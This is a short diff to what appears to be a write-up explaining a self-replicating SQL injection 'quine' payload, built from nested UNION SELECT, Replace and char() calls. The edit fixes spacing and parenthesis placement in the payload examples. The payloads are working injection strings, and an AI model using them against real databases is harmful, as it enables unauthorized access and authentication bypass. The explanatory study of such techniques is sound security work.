@@ -131,7 +131,7 @@ Thus, we can see how the query repeats itself.
 ```sql
 \' UNION SELECT Replace(Replace(
 '" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23',
-char(34),char( 39)),char(36), 
+char(34),char(39)),char(36), 
 '" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23')
 %23
 ```
@@ -172,8 +172,8 @@ Replace all occurrences of `char(36)` (dollar sign `$` character) with the o
 '\' UNION SELECT Replace(Replace(
 \'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\'
 ,char(34),char(39)),char(36),
-\'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\'
-)%23'
+\'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\')
+%23'
 -- - %23 -- -
 ```
 ### Putting it all together
